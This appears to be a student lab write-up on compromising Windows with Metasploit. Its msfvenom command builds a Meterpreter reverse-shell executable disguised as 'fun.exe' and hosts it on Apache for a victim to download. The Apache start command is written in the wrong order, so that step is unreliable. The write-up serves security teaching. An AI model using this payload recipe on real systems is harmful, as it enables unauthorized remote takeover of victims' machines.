# Name: Gowtham N
# Reg no: 212222220013
# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:

![image](https://github.com/user-attachments/assets/0aefccb0-15b1-4319-8950-3bde65b867b1)
Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
![image](https://github.com/user-attachments/assets/afa93003-0550-437f-af4b-556a420fa1c8)
copy the fun.exe into the apache /var/www/html folder
Start apache server
sudo systemctl apache2 start
![image](https://github.com/user-attachments/assets/42a365d9-0ae1-4572-a186-cd48d34f751e)
Check the status of apache2


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
